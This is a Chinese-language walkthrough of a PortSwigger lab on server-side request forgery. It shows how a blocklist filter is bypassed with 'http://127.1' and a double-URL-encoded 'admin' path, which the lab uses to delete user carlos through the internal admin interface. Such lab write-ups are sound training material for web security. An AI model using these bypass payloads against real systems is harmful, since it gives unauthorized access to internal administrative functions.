# 基于黑名单input filter的SSRF

来源：portswigger

题目描述：

这个LAB有库存检查功能，可以从内部系统获取数据。

要解决实验室问题，可以更改库存检查URL以访问管理员界面:

```
http://localhost/admin
```

并删除carlos

开发者部署了两个薄弱的SSRF防御措施，你需要绕过这些防御

https://portswigger.net/academy/labs/launch/f97f7df5a96da8563edc18e5544b8ef962f8ee47abd9b9bb3d30706f15bff341?referrer=%2fweb-security%2fssrf%2flab-ssrf-with-blacklist-filter

#### Solution:

根据题目描述，可以知道在库存检查功能中存在SSRF漏洞

抓包该请求：

![image-20251221194503300](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251221194503300.png)

发现这个 `stockApi` 可以输入URL，我们通过修改URL来访问管理员界面：

```
stockApi=http://127.0.0.1
```

![image-20251221194619985](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251221194619985.png)

发现返回400

所以说是有黑名单的。

```
http://127.1
```

发现可以，所以继续尝试：

```
http://127.1/admin
```

发现![image-20251221200437303](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251221200437303.png)

所以admin是被限制的。

对admin进行双重URL编码：

```
http://127.1/%2561%2564%256D%2569%256E/delete?username=carlos
```

成功删除！